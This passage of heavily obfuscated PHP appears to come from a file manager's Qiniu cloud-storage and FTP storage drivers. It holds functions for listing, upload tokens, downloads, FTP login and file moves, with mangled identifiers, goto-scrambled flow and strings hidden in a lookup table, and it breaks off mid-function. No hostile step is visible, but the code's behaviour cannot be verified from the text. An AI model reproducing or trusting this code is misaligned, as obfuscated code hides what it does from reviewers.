$D­¾Æ±ñİ‘[$FÖĞë¼öÑ[1279]] : 0, $FÖĞë¼öÑ[167] => $this->ext($A›ª¬¢ö¶¼)); if ($eßŠê¨…„) { return $A¼øœ‹ê°ê; } goto Dàõ‡•¡Ä›; D±ö‚³„ò´: if (isset($D­¾Æ±ñİ‘[$FÖĞë¼öÑ[1280]])) { $A¼øœ‹ê°ê[$FÖĞë¼öÑ[83]] = substr($D­¾Æ±ñİ‘[$FÖĞë¼öÑ[1280]] . $FÖĞë¼öÑ[33], 0, 10); } if (isset($D­¾Æ±ñİ‘[$FÖĞë¼öÑ[1279]])) { $A¼øœ‹ê°ê[$FÖĞë¼öÑ[77]] = $D­¾Æ±ñİ‘[$FÖĞë¼öÑ[1279]]; } return $A¼øœ‹ê°ê; goto B¼š¾ãºï•; B¼š¾ãºï•: } public function folderInfo($bÒíÖ´‘İ, $bë”÷Ñô¶½ = false) { goto d¸³©¦Â¢; cŸàÏìÅÊ³: $eª—ôÂ·Ò[$BØÛóÔ«ó¡[192]] = $eª—ôÂ·Ò[$BØÛóÔ«ó¡[83]] = 0; $eª—ôÂ·Ò[$BØÛóÔ«ó¡[193]] = $eª—ôÂ·Ò[$BØÛóÔ«ó¡[194]] = !0; $bÒíÖ´‘İ = rtrim($bÒíÖ´‘İ, $BØÛóÔ«ó¡[8]) . $BØÛóÔ«ó¡[8]; goto bÉ©¨±¡µ; bÉ©¨±¡µ: $B‘¸µÎ‰òÓ = $this->objectMeta($bÒíÖ´‘İ); if (isset($B‘¸µÎ‰òÓ[$BØÛóÔ«ó¡[1280]])) { $eª—ôÂ·Ò[$BØÛóÔ«ó¡[83]] = substr($B‘¸µÎ‰òÓ[$BØÛóÔ«ó¡[1280]] . $BØÛóÔ«ó¡[33], 0, 10); } return $eª—ôÂ·Ò; goto dØõªØÍ×; d¸³©¦Â¢: $BØÛóÔ«ó¡ =& $_SERVER[¹Ò‹Ò¹]; $eª—ôÂ·Ò = array($BØÛóÔ«ó¡[28] => $this->pathThis($bÒíÖ´‘İ), $BØÛóÔ«ó¡[75] => $this->getPathOuter($BØÛóÔ«ó¡[8] . $bÒíÖ´‘İ), $BØÛóÔ«ó¡[29] => $BØÛóÔ«ó¡[76]); if ($bë”÷Ñô¶½) { return $eª—ôÂ·Ò; } goto cŸàÏìÅÊ³; dØõªØÍ×: } public function listPath($D‰©­²ùŞ, $cñ±ƒ²¤ª¼ = false) { $FØé­®îĞ‘ =& $_SERVER[¹Ò‹Ò¹]; $B„ î¯‘¸ã = $this->fileList($D‰©­²ùŞ, $FØé­®îĞ‘[8], !0); foreach ($B„ î¯‘¸ã[$FØé­®îĞ‘[74]] as $E¥ÕŠÊÂ¡ñ => $C÷Õ…ä‰‡) { $B„ î¯‘¸ã[$FØé­®îĞ‘[74]][$E¥ÕŠÊÂ¡ñ] = $this->folderInfo($C÷Õ…ä‰‡, $cñ±ƒ²¤ª¼); } foreach ($B„ î¯‘¸ã[$FØé­®îĞ‘[73]] as $E¥ÕŠÊÂ¡ñ => $C÷Õ…ä‰‡) { $B„ î¯‘¸ã[$FØé­®îĞ‘[73]][$E¥ÕŠÊÂ¡ñ] = $this->fileInfo($C÷Õ…ä‰‡[$FØé­®îĞ‘[92]], $cñ±ƒ²¤ª¼, $C÷Õ…ä‰‡); } return $B„ î¯‘¸ã; } public function has($EˆìÖ²“, $aŠ ’ƒÏÔ = false, $cÖ­ñ“¤ÁŸ = true) { goto A£ç†¸Èä; aÎÏôóÅ¢¯: $E¡õ£Êğ¤ = $f¤¹Â§áà‹ = 0; while (!0) { check_abort(); list($dº¦‡”‰Ú, $eÑÕ¦ìª’‡) = $this->bucketManager->listFiles($this->bucket, $CÎùï¸£Ô×, $f´¡°˜„²È, $D‰Ä™®š­, $cï”ÛÂùö); if ($eÑÕ¦ìª’‡) { break; } $f´¡°˜„²È = array_key_exists($eÁ†„ïÉƒŠ[1249], $dº¦‡”‰Ú) ? $f´¡°˜„²È = $dº¦‡”‰Ú[$eÁ†„ïÉƒŠ[1281]] : $eÁ†„ïÉƒŠ[33]; if ($aŠ ’ƒÏÔ) { if (!empty($dº¦‡”‰Ú[$eÁ†„ïÉƒŠ[1282]])) { $E¡õ£Êğ¤ += count($dº¦‡”‰Ú[$eÁ†„ïÉƒŠ[1282]]); } if (!empty($dº¦‡”‰Ú[$eÁ†„ïÉƒŠ[1283]])) { $f¤¹Â§áà‹ += count($dº¦‡”‰Ú[$eÁ†„ïÉƒŠ[1283]]); } if ($f´¡°˜„²È === $eÁ†„ïÉƒŠ[33]) { break; } continue; } if ($cÖ­ñ“¤ÁŸ) { if (!empty($dº¦‡”‰Ú[$eÁ†„ïÉƒŠ[1282]])) { return !0; } } else { if (!empty($dº¦‡”‰Ú[$eÁ†„ïÉƒŠ[1283]])) { return !0; } } if ($f´¡°˜„²È === $eÁ†„ïÉƒŠ[33]) { break; } } if ($aŠ ’ƒÏÔ) { return array($eÁ†„ïÉƒŠ[201] => $E¡õ£Êğ¤, $eÁ†„ïÉƒŠ[202] => $f¤¹Â§áà‹); } goto bî¹â‚µâŠ; a¸º¥˜¿Åİ: $f´¡°˜„²È = $eÁ†„ïÉƒŠ[33]; $D‰Ä™®š­ = 500; $cï”ÛÂùö = $eÁ†„ïÉƒŠ[8]; goto aÎÏôóÅ¢¯; bî¹â‚µâŠ: return !1; goto d¶„ìğ¸‡î; A£ç†¸Èä: $eÁ†„ïÉƒŠ =& $_SERVER[¹Ò‹Ò¹]; $EˆìÖ²“ = trim($EˆìÖ²“, $eÁ†„ïÉƒŠ[8]); $CÎùï¸£Ô× = empty($EˆìÖ²“) ? $eÁ†„ïÉƒŠ[33] : $EˆìÖ²“ . $eÁ†„ïÉƒŠ[8]; goto a¸º¥˜¿Åİ; d¶„ìğ¸‡î: } public function listAll($f‰É²‚ç) { $Fáôõ‡é§´ =& $_SERVER[¹Ò‹Ò¹]; $d‡àïœÆ”¶ = $this->fileList($f‰É²‚ç, $Fáôõ‡é§´[33], !0); $aŠƒ¸İ–È = array(); foreach ($d‡àïœÆ”¶[$Fáôõ‡é§´[73]] as $b¨¡ÏÁÄ¢) { $aŠƒ¸İ–È[$b¨¡ÏÁÄ¢[$Fáôõ‡é§´[92]]] = $b¨¡ÏÁÄ¢[$Fáôõ‡é§´[77]]; } foreach ($d‡àïœÆ”¶[$Fáôõ‡é§´[74]] as $b¨¡ÏÁÄ¢) { if (is_string($b¨¡ÏÁÄ¢)) { $aŠƒ¸İ–È[$b¨¡ÏÁÄ¢] = 0; } } return $this->listAllFiles($f‰É²‚ç, array_keys($aŠƒ¸İ–È), $aŠƒ¸İ–È); } private function fileList($DĞÉ—ß‹ÎÖ, $F¦®³ÅØ–Â = '', $dØÄ™™½ = 0) { goto fÙ…”™­¯; cà×íÅŠÎ´: $AÖËµíÉçê = $AˆØùÎÏç—[33]; $EÚßêã£÷Ò = 1000; $eÚÄ¡¹ŒŠ = $this->listItemCache === !1 ? !1 : !0; goto d³ÎÃÜ˜; d§ëŒ²Ú¤: return array($AˆØùÎÏç—[74] => $D†øèÃ¬ÄÜ, $AˆØùÎÏç—[73] => $aËé‹º±ğ‰); goto FñÛôÙğ²É; fÙ…”™­¯: $AˆØùÎÏç— =& $_SERVER[¹Ò‹Ò¹]; $DĞÉ—ß‹ÎÖ = trim($DĞÉ—ß‹ÎÖ, $AˆØùÎÏç—[8]); $d¸ù«Ÿ† = empty($DĞÉ—ß‹ÎÖ) ? $AˆØùÎÏç—[33] : $DĞÉ—ß‹ÎÖ . $AˆØùÎÏç—[8]; goto cà×íÅŠÎ´; d³ÎÃÜ˜: $D†øèÃ¬ÄÜ = $aËé‹º±ğ‰ = array(); while (!0) { check_abort(); list($FÓ¹‹ïÉ¬’, $f†Æé„¦¤×) = $this->bucketManager->listFiles($this->bucket, $d¸ù«Ÿ†, $AÖËµíÉçê, $EÚßêã£÷Ò, $F¦®³ÅØ–Â); if ($f†Æé„¦¤×) { break; } $AÖËµíÉçê = array_key_exists($AˆØùÎÏç—[1249], $FÓ¹‹ïÉ¬’) ? $AÖËµíÉçê = $FÓ¹‹ïÉ¬’[$AˆØùÎÏç—[1281]] : $AˆØùÎÏç—[33]; $aƒ¯ˆÓÎŒà = isset($FÓ¹‹ïÉ¬’[$AˆØùÎÏç—[1282]]) ? $FÓ¹‹ïÉ¬’[$AˆØùÎÏç—[1282]] : array(); $c¼Ï¨Æˆ = isset($FÓ¹‹ïÉ¬’[$AˆØùÎÏç—[1283]]) ? $FÓ¹‹ïÉ¬’[$AˆØùÎÏç—[1283]] : array(); foreach ($aƒ¯ˆÓÎŒà as $A‡Š¦ĞâÙ) { goto BÑĞÌòÔó§; BÑĞÌòÔó§: if ($A‡Š¦ĞâÙ[$AˆØùÎÏç—[92]] == $d¸ù«Ÿ†) { continue; } $E£Œ¤–•å¥ = $A‡Š¦ĞâÙ[$AˆØùÎÏç—[92]]; $Bò×§…ª¬· = $A‡Š¦ĞâÙ[$AˆØùÎÏç—[1279]]; goto eÆÂ¶ìĞ©²; eÆÂ¶ìĞ©²: $A‡Š¦ĞâÙ[$AˆØùÎÏç—[77]] = $Bò×§…ª¬·; $dµ‚±¯Ñ²÷ = $Bò×§…ª¬· == 0 && substr($E£Œ¤–•å¥, strlen($E£Œ¤–•å¥) - 1, 1) == $AˆØùÎÏç—[8] ? !0 : !1; if ($eÚÄ¡¹ŒŠ) { $this->cacheMethod($AˆØùÎÏç—[197], $E£Œ¤–•å¥, $dµ‚±¯Ñ²÷); $this->cacheMethod($AˆØùÎÏç—[198], $E£Œ¤–•å¥, $A‡Š¦ĞâÙ); } goto Bì‹ğòÄ¸ó; Bì‹ğòÄ¸ó: if ($dµ‚±¯Ñ²÷) { $D†øèÃ¬ÄÜ[] = $E£Œ¤–•å¥; continue; } $aËé‹º±ğ‰[] = $dØÄ™™½ ? $A‡Š¦ĞâÙ : $E£Œ¤–•å¥; goto B‘‰ª‹Íö‘; B‘‰ª‹Íö‘: } foreach ($c¼Ï¨Æˆ as $E£Œ¤–•å¥) { if ($E£Œ¤–•å¥ == $d¸ù«Ÿ†) { continue; } $D†øèÃ¬ÄÜ[] = $E£Œ¤–•å¥; if ($eÚÄ¡¹ŒŠ) { $this->cacheMethod($AˆØùÎÏç—[197], $E£Œ¤–•å¥, !0); } } if ($AÖËµíÉçê === $AˆØùÎÏç—[33]) { break; } } if ($eÚÄ¡¹ŒŠ) { $this->cacheMethod($AˆØùÎÏç—[197], $DĞÉ—ß‹ÎÖ, !0); } goto d§ëŒ²Ú¤; FñÛôÙğ²É: } public function canRead($c…ç à­çí) { return $this->exist($c…ç à­çí) ? !0 : !1; } public function canWrite($bÍÙ¼ˆ«è±) { return $this->exist($bÍÙ¼ˆ«è±) ? !0 : !1; } public function getContent($AÎŞÎË£ÍÆ) { return $this->fileSubstr($AÎŞÎË£ÍÆ, 0, -1); } public function setContent($BÁÇöã¹ß, $C¨ƒÇœíåÃ = '') { $AĞŞ§§ÏÌ = $this->tempFile($this->pathThis($BÁÇöã¹ß)); file_put_contents($AĞŞ§§ÏÌ, $C¨ƒÇœíåÃ); if ($this->upload($BÁÇöã¹ß, $AĞŞ§§ÏÌ)) { $this->tempFileRemve($AĞŞ§§ÏÌ); return !0; } return !1; } public function refreshUrls($c¼–ä¶°Ú) { goto d»¹ËÃ–·; Fã‘ÇÂõ : return $DŠ”§Ö¶[$AÙÙÖÒŠğ£[1053]] == $AÙÙÖÒŠğ£[711] ? !0 : !1; goto CØ÷·ÆĞçí; d»¹ËÃ–·: $AÙÙÖÒŠğ£ =& $_SERVER[¹Ò‹Ò¹]; $C§ùêÔæ»¸ = array(); if (is_array($c¼–ä¶°Ú)) { foreach ($c¼–ä¶°Ú as $DŠ‡¿‰«‹õ) { $C§ùêÔæ»¸[] = $this->link($DŠ‡¿‰«‹õ); } } else { $C§ùêÔæ»¸[] = $this->link($c¼–ä¶°Ú); } goto d­¾ñÅ˜‹ø; d­¾ñÅ˜‹ø: $cè¨æ±ßĞ‘ = new Qiniu\Cdn\CdnManager($this->auth); list($DŠ”§Ö¶, $B‚è“‰öğÁ) = $cè¨æ±ßĞ‘->refreshUrls($C§ùêÔæ»¸); if ($B‚è“‰öğÁ) { return !1; } goto Fã‘ÇÂõ ; CØ÷·ÆĞçí: } public function fileSubstr($Fß•Û’‚¨î, $däÈÓ©œ§, $dñó‚µ¤Ûƒ) { $BåÉÙéë’ =& $_SERVER[¹Ò‹Ò¹]; if (!($bò™íœ†î‡ = $this->link($Fß•Û’‚¨î))) { return !1; } $bª½ñ ¿¯÷ = !1; if ($dñó‚µ¤Ûƒ > 0) { $a‘ÂÜâ = $däÈÓ©œ§ + $dñó‚µ¤Ûƒ - 1; $bª½ñ ¿¯÷ = array($BåÉÙéë’[1284] . $däÈÓ©œ§ . $BåÉÙéë’[434] . $a‘ÂÜâ); } $fŞÜ…ÄŠºÆ = url_request($bò™íœ†î‡, $BåÉÙéë’[226], !1, $bª½ñ ¿¯÷); return $fŞÜ…ÄŠºÆ[$BåÉÙéë’[704]] ? $fŞÜ…ÄŠºÆ[$BåÉÙéë’[1063]] : !1; } public function upload($AóÒËÓ÷ñ›, $D–Úœãæ, $eóÀëê± = false, $Cçœó´æ‹‰ = REPEAT_REPLACE) { $e¢ÌÎôêÃ = new Qiniu\Storage\UploadManager(); $BóÊºĞ¨»Í = $this->auth->uploadToken($this->bucket, $AóÒËÓ÷ñ›); $D Ïê±É‡ = get_file_mime(get_path_ext($D–Úœãæ)); list($fé“¬ÇùŠª, $F–£êòƒ) = $e¢ÌÎôêÃ->putFile($BóÊºĞ¨»Í, $AóÒËÓ÷ñ›, $D–Úœãæ, null, $D Ïê±É‡); return $F–£êòƒ ? !1 : $this->getPathOuter($AóÒËÓ÷ñ›); } public function uploadFormData($b­÷Ä Í‚¯, $eˆ‡ø›‡´‘ = 3600) { return $this->uploadToken($b­÷Ä Í‚¯, $eˆ‡ø›‡´‘); } public function multiUploadFormData($Cšùò£Óô, $cö·ã„ƒ·ù = 3600) { return $this->uploadToken($Cšùò£Óô, $cö·ã„ƒ·ù); } private function uploadToken($d»Š˜Í·…ƒ, $a”ÏÏºï…ó = 3600) { goto Cš•òæ«; Cš•òæ«: $E†±ÇÄæòÏ =& $_SERVER[¹Ò‹Ò¹]; $EˆŒ—‚öÜ™ = $a”ÏÏºï…ó; $FÕ‚›¬…ÖÜ = array($E†±ÇÄæòÏ[1285] => $E†±ÇÄæòÏ[1286]); goto A£é‰ÓŒÑ; cÊ¿»à©¬‰: $Eß±é¶»ßà = http_type() . "\x3a\57\x2f\165\160\154\157\x61\x64{$e¥µÄ¬ëè÷}\x2e\x71\x69\x6e\x69\165\x70\x2e\143\157\x6d\x2f"; return array($E†±ÇÄæòÏ[1288] => $E©ôÚ˜Šè, $E†±ÇÄæòÏ[1289] => $Eß±é¶»ßà); goto e“„—‚¬²˜; A£é‰ÓŒÑ: $BÙÀÈ¹Î– = $d»Š˜Í·…ƒ; $E©ôÚ˜Šè = $this->auth->uploadToken($this->bucket, $BÙÀÈ¹Î–, $EˆŒ—‚öÜ™, $FÕ‚›¬…ÖÜ, !0); $e¥µÄ¬ëè÷ = empty($this->region) || $this->region == $E†±ÇÄæòÏ[1287] ? $E†±ÇÄæòÏ[33] : $E†±ÇÄæòÏ[434] . $this->region; goto cÊ¿»à©¬‰; e“„—‚¬²˜: } public function download($d»ø•²ˆ¡¶, $dÅ‹ŸÑÚÕ) { goto c«ÊßéË°ñ; Aå‡îŠ®Èî: fclose($EøêÈÄøš’); return $dÅ‹ŸÑÚÕ; goto A¬Òä§ÅÑ¹; c«ÊßéË°ñ: $cª¨ğ£Ù¢Ê = IO::getPathInner(IO::mkfile($dÅ‹ŸÑÚÕ)); if (!($c®­Ê´ô‰ˆ = $this->link($d»ø•²ˆ¡¶))) { return !1; } $D—¨¼ëŞ©Œ = 0; goto F÷Ú¾áçİ°; F÷Ú¾áçİ°: $B ‘Ü¸Ù… = 1024 * 200; $EøêÈÄøš’ = fopen($cª¨ğ£Ù¢Ê, $_SERVER[¹Ò‹Ò¹][1290]); while (!0) { $F·½ƒŸßˆ = $this->fileSubstr($d»ø•²ˆ¡¶, $D—¨¼ëŞ©Œ, $B ‘Ü¸Ù…); if ($F·½ƒŸßˆ === !1) { return !1; } fwrite($EøêÈÄøš’, $F·½ƒŸßˆ); $D—¨¼ëŞ©Œ += $B ‘Ü¸Ù…; if (strlen($F·½ƒŸßˆ) < $B ‘Ü¸Ù…) { break; } } goto Aå‡îŠ®Èî; A¬Òä§ÅÑ¹: } public function link($eùƒ¶ö­‚, $d—òßó±½ì = '') { if (!$this->isFile($eùƒ¶ö­‚)) { return !1; } $eöÅë‚ôÕ± = $this->getHost() . $_SERVER[¹Ò‹Ò¹][8] . $this->pathEncode($eùƒ¶ö­‚) . $d—òßó±½ì; return $this->auth->privateDownloadUrl($eöÅë‚ôÕ±, 3600 * 12); } public function fileOut($AÕ‰Ö†š±‚, $B™¿ĞÎÎ‹ô = false, $EæëŞ½‹èò = false, $E·ëä×Ôœ• = '') { $Cõ¡âã¢–Ó =& $_SERVER[¹Ò‹Ò¹]; if ($this->isFileOutServer()) { return $this->fileOutServer($AÕ‰Ö†š±‚, $B™¿ĞÎÎ‹ô, $EæëŞ½‹èò, $E·ëä×Ôœ•); } if (!$EæëŞ½‹èò) { $EæëŞ½‹èò = $this->pathThis($AÕ‰Ö†š±‚); } $c£«­·† = $B™¿ĞÎÎ‹ô ? $Cõ¡âã¢–Ó[1291] . rawurlencode($EæëŞ½‹èò) : $Cõ¡âã¢–Ó[33]; $d­“ßŞ¦¢ = $this->link($AÕ‰Ö†š±‚, $c£«­·†); $this->fileOutLink($d­“ßŞ¦¢); } public function fileOutServer($F¸óÁ½ŞçÙ, $Aš—µ”¤¬ = false, $D­èƒ°¹»‹ = false, $b¬ˆ „•ÕË = '') { parent::fileOut($F¸óÁ½ŞçÙ, $Aš—µ”¤¬, $D­èƒ°¹»‹, $b¬ˆ „•ÕË); } public function fileOutImage($EçÌ—öø¦, $F–°¤§¹”À = 250) { $Fà³‹éî£Ş = $this->link($EçÌ—öø¦, $_SERVER[¹Ò‹Ò¹][1292] . $F–°¤§¹”À); $this->fileOutLink($Fà³‹éî£Ş); } public function fileOutImageServer($b–ÏÕ§À, $cº¿ËïİÂ = 250) { parent::fileOutImage($b–ÏÕ§À, $cº¿ËïİÂ); } public function hashMd5($Bğäõôï¥­) { $A¥‘æ¶„Õí =& $_SERVER[¹Ò‹Ò¹]; $CÂË¶ªˆ„Ú = $this->objectMeta($Bğäõôï¥­); return isset($CÂË¶ªˆ„Ú[$A¥‘æ¶„Õí[206]]) ? $CÂË¶ªˆ„Ú[$A¥‘æ¶„Õí[206]] : !1; $FñÆôŒ¡¼Ş = $this->link($Bğäõôï¥­, $A¥‘æ¶„Õí[1293]); } public function size($BšĞ‘´´Çø) { $cƒÛ­ß™Ì© = $this->objectMeta($BšĞ‘´´Çø); return $cƒÛ­ß™Ì© ? $cƒÛ­ß™Ì©[$_SERVER[¹Ò‹Ò¹][77]] : 0; } public function info($aí¡Á¡Ø«) { if ($this->isFolder($aí¡Á¡Ø«)) { return $this->folderInfo($aí¡Á¡Ø«); } else { if ($this->isFile($aí¡Á¡Ø«)) { return $this->fileInfo($aí¡Á¡Ø«); } } return !1; } public function exist($aÀÓ©™) { return $this->isFile($aÀÓ©™) || $this->isFolder($aÀÓ©™); } public function isFile($f²öŞ£À„) { return !$this->isFolder($f²öŞ£À„) && $this->objectMeta($f²öŞ£À„); } public function isFolder($B¼¦»ˆï­™) { return $this->cacheMethod($_SERVER[¹Ò‹Ò¹][197], $B¼¦»ˆï­™); } protected function objectMeta($f½æˆ´õì«) { return $this->cacheMethod($_SERVER[¹Ò‹Ò¹][198], $f½æˆ´õì«); } protected function _objectMeta($AíÜäëÔä”) { $aªæİËñ‰ğ =& $_SERVER[¹Ò‹Ò¹]; list($aØ…×µß†ø, $f†Ó‘è£·æ) = $this->bucketManager->stat($this->bucket, $AíÜäëÔä”); if ($aØ…×µß†ø) { $aØ…×µß†ø[$aªæİËñ‰ğ[77]] = intval($aØ…×µß†ø[$aªæİËñ‰ğ[1279]]); } return $aØ…×µß†ø; } protected function _isFolder($DÑ¼ï‚«×) { $dƒëê˜ºÔ =& $_SERVER[¹Ò‹Ò¹]; if ($DÑ¼ï‚«× == $dƒëê˜ºÔ[33] || $DÑ¼ï‚«× == $dƒëê˜ºÔ[8]) { return !0; } list($e¥ğ””’ì, $F…Èˆ‘ëç¦) = $this->bucketManager->listFiles($this->bucket, trim($DÑ¼ï‚«×, $dƒëê˜ºÔ[8]) . $dƒëê˜ºÔ[8], $dƒëê˜ºÔ[33], 1, $dƒëê˜ºÔ[8]); return !empty($e¥ğ””’ì[$dƒëê˜ºÔ[1282]]) || !empty($e¥ğ””’ì[$dƒëê˜ºÔ[1283]]) ? !0 : !1; } } goto f£ï¼Ûèá; A·ø®±•¨Ü: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($c·áºèª°Ò) { parent::__construct(); if (count($c·áºèª°Ò) > 0) { $this->_init($c·áºèª°Ò); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($BÛ„ŠÏŠ·’) { $CÊİ¢²æ›” =& $_SERVER[¹Ò‹Ò¹]; global $config; $this->appCharset = $config[$CÊİ¢²æ›”[1217]]; $this->systemCharset = $config[$CÊİ¢²æ›”[1218]]; if (isset($BÛ„ŠÏŠ·’[$CÊİ¢²æ›”[1219]]) && $BÛ„ŠÏŠ·’[$CÊİ¢²æ›”[1219]]) { $this->systemCharset = $BÛ„ŠÏŠ·’[$CÊİ¢²æ›”[1219]]; } } public function iconvApp($F“ë•„‚„Á) { return $this->iconvTo($F“ë•„‚„Á, $this->systemCharset, $this->appCharset); } public function iconvSystem($fò¦ÑÛÖ‘) { return $this->iconvTo($fò¦ÑÛÖ‘, $this->appCharset, $this->systemCharset); } public function getPathOuter($EÊá¿Ÿ£®) { goto Aœ‹‚÷Õää; f Í¤™¯íë: return $this->pathDriver . $B°è¥¤Ù[8] . ltrim($EÊá¿Ÿ£®, $B°è¥¤Ù[8]); goto A×Í¥‚ó’„; Aœ‹‚÷Õää: $B°è¥¤Ù =& $_SERVER[¹Ò‹Ò¹]; $d†©ëš¥áå = $this->iconvApp($this->pathBase); $EÊá¿Ÿ£® = $this->iconvApp($EÊá¿Ÿ£®); goto c¿òŠÛ¬Í; c¿òŠÛ¬Í: if (substr($d†©ëš¥áå, 0, 2) == $B°è¥¤Ù[1220]) { $d†©ëš¥áå = BASIC_PATH . substr($d†©ëš¥áå, 2); } if (substr($EÊá¿Ÿ£®, 0, 2) == $B°è¥¤Ù[1220]) { $EÊá¿Ÿ£® = BASIC_PATH . substr($EÊá¿Ÿ£®, 2); } $d†©ëš¥áå = KodIO::clear($d†©ëš¥áå); goto F§‘Œ¼Ğ¿; F§‘Œ¼Ğ¿: $EÊá¿Ÿ£® = KodIO::clear($EÊá¿Ÿ£®); $EÊá¿Ÿ£® = substr($EÊá¿Ÿ£®, strlen($d†©ëš¥áå)); if (empty($this->pathDriver)) { return $EÊá¿Ÿ£®; } goto f Í¤™¯íë; A×Í¥‚ó’„: } private function _init($dœßº´ĞØğ = array()) { $b“åİŠ¼¢ =& $_SERVER[¹Ò‹Ò¹]; if (!function_exists($b“åİŠ¼¢[1221])) { throw new Exception(LNG($b“åİŠ¼¢[1222])); } $this->config = $dœßº´ĞØğ; $this->charsetReset($dœßº´ĞØğ); foreach ($dœßº´ĞØğ as $cƒÚÉéŸ => $ağÑÎÉë») { if (isset($this->{$cƒÚÉéŸ})) { $this->{$cƒÚÉéŸ} = $ağÑÎÉë»; } } return $this->_login($dœßº´ĞØğ); } private function _login($a“È‘·ˆˆ©) { goto cò¼äÅÊÜô; DÍÒâİ…À±: if (isset($b´µ¸Îµ‹‚[$EèÒ¿Â™îĞ])) { foreach ($b´µ¸Îµ‹‚[$EèÒ¿Â™îĞ] as $f„ø›èè°ô => $e³ö¢µïè) { $this->{$f„ø›èè°ô} = $e³ö¢µïè; } return !0; } $eÊœá²¨Õ = parse_url(trim($this->server, $e±í¹çæ§â[8])); $this->host = $eÊœá²¨Õ[$e±í¹çæ§â[174]]; goto F®±Œ÷Òƒç; dÀååø«: $b´µ¸Îµ‹‚[$EèÒ¿Â™îĞ] = array($e±í¹çæ§â[1226] => $this->connect, $e±í¹çæ§â[174] => $this->host, $e±í¹çæ§â[173] => $this->scheme, $e±í¹çæ§â[175] => $this->port); return $càê·Öµˆ°; goto B´‘«÷Ñª; cò¼äÅÊÜô: $e±í¹çæ§â =& $_SERVER[¹Ò‹Ò¹]; static $b´µ¸Îµ‹‚ = array(); $EèÒ¿Â™îĞ = md5(json_encode($a“È‘·ˆˆ©)); goto DÍÒâİ…À±; F®±Œ÷Òƒç: $d«Î ŒÒ ï = isset($eÊœá²¨Õ[$e±í¹çæ§â[173]]) && $eÊœá²¨Õ[$e±í¹çæ§â[173]] == $e±í¹çæ§â[1223] ? !0 : !1; $this->scheme = $d«Î ŒÒ ï ? $e±í¹çæ§â[1224] : $e±í¹çæ§â[1225]; $this->port = isset($eÊœá²¨Õ[$e±í¹çæ§â[175]]) ? $eÊœá²¨Õ[$e±í¹çæ§â[175]] : 21; goto EˆŒõÜœ‰½; EˆŒõÜœ‰½: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $càê·Öµˆ° = @ftp_login($this->connect, $this->username, $this->userpass); goto d§àÚÊ…ôò; d§àÚÊ…ôò: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $C‚»ØºÖ‡À = $this->pasv == $e±í¹çæ§â[86] ? !0 : !1; @ftp_pasv($this->connect, $C‚»ØºÖ‡À); goto dÀååø«; B´‘«÷Ñª: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($F–¨Ø£ï, $fàœ™¶ëÅ = '', $Eéœø¢Ù = REPEAT_RENAME) { if ($this->setContent($F–¨Ø£ï, $fàœ™¶ëÅ)) { return $this->getPathOuter($F–¨Ø£ï); } return !1; } public function mkdir($B§©ÀíéÀ, $d÷Šğë¤Ë = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $B§©ÀíéÀ = $this->iconvSystem($B§©ÀíéÀ); if ($this->_isFolder($B§©ÀíéÀ) || @ftp_mkdir($this->connect, $B§©ÀíéÀ)) { return $this->getPathOuter($B§©ÀíéÀ); } if (!$this->mkdir($this->pathFather($B§©ÀíéÀ))) { return !1; } if ($B§©ÀíéÀ = @ftp_mkdir($this->connect, $B§©ÀíéÀ)) { return $this->getPathOuter($B§©ÀíéÀ); } return !1; } public function copyFile($fùÊ—Ÿ–»¯, $a–ÉÓ†šÌç) { goto Cë® ‰»á†; c’¹˜»×Úñ: $a‘Š¶õ¼¦ = $this->iconvApp($C¿‡¦ö”Äá); $this->download($fùÊ—Ÿ–»¯, $a‘Š¶õ¼¦); $A÷„´¦ó• = $this->upload($a–ÉÓ†šÌç, $a‘Š¶õ¼¦); goto AŸªÅ–³‹Ç; AŸªÅ–³‹Ç: $this->tempFileRemve($C¿‡¦ö”Äá); return $A÷„´¦ó•; goto aøääÏá¤ğ; Cë® ‰»á†: if (!$this->_isconn()) { return !1; } $dìğøòµÌ = $this->pathThis($this->iconvSystem($fùÊ—Ÿ–»¯)); $C¿‡¦ö”Äá = $this->tempFile($dìğøòµÌ); goto c’¹˜»×Úñ; aøääÏá¤ğ: } public function moveFile($b‰®Û§·ì§, $dçŸó¢ÊØ) { if (!$this->_isconn()) { return !1; } $b‰®Û§·ì§ = $this->iconvSystem($b‰®Û§·ì§); $dçŸó¢ÊØ = $this->iconvSystem($dçŸó¢ÊØ); $d¼˜¶î„™ê = @ftp_rename($this->connect, $b‰®Û§·ì§, $dçŸó¢ÊØ); return $d¼˜¶î„™ê ? $this->getPathOuter($dçŸó¢ÊØ) : !1; } public function delFile($d×˜ˆî¶ÌÅ) { if (!$this->_isconn()) { return !1; } $d×˜ˆî¶ÌÅ = $this->iconvSystem($d×˜ˆî¶ÌÅ); return @ftp_delete($this->connect, $d×˜ˆî¶ÌÅ); } public function delFolder($FÁÃå‘®Í—) { goto B‹‰´ºİà; B‹‰´ºİà: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $dÅ¸Ñš‹» = $Bõ¸·É…ø = array(); goto f‹ĞóÊ¸²¦; C†óºÃ«…›: foreach ($dÅ¸Ñš‹» as $E¢äˆ®œ±œ) { $E¢äˆ®œ±œ = $this->iconvSystem($E¢äˆ®œ±œ); $Eš–öï¤ƒ = @ftp_rmdir($this->connect, $E¢äˆ®œ±œ); if (!$Eš–öï¤ƒ) { return !1; } } $FÁÃå‘®Í— = $this->iconvSystem($FÁÃå‘®Í—); return @ftp_rmdir($this->connect, $FÁÃå‘®Í—); goto Dù¶…¬¥í¶; f‹ĞóÊ¸²¦: $this->fileList($FÁÃå‘®Í—, $dÅ¸Ñš‹», $Bõ¸·É…ø, !0); $this->listItemCache = !0; foreach ($Bõ¸·É…ø as $fƒ¡Ñ½Ğ) { $E¢äˆ®œ±œ = $this->iconvSystem($fƒ¡Ñ½Ğ[$_SERVER[¹Ò‹Ò¹][28]]); $Eš–öï¤ƒ = @ftp_delete($this->connect, $E¢äˆ®œ±œ); if (!$Eš–öï¤ƒ) { return !1; } } goto C†óºÃ«…›; Dù¶…¬¥í¶: } public function rename($eÔæ¶æ‡…, $BÎ‹‹ÙÔ‚) { goto 